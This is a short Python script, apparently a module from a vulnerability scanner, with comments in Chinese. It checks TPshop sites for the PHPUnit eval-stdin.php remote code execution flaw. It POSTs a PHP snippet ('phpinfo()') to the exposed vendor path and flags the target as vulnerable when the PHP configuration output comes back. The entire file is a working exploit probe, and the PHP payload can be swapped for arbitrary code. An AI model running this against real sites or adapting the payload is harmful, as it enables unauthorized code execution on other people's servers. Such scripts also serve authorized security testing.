#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: TPshop eval-stdin.php 代码执行漏洞
referer: unknown
author: Lucifer
description: 文件eval-stdin.php存在后门。
'''
import sys
import json
import requests



class tpshop_eval_stdin_code_exec_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
        post_data = "<?php phpinfo();?>"
        vulnurl = self.url + payload
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if r"Configuration File (php.ini) Path" in req.text:
                return "[+]存在TPshop eval-stdin.php 代码执行漏洞...(高危)\tpayload: "+vulnurl+"\tpost: "+json.dumps(post_data, indent=4)

        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = tpshop_eval_stdin_code_exec_BaseVerify(sys.argv[1])
    testVuln.run()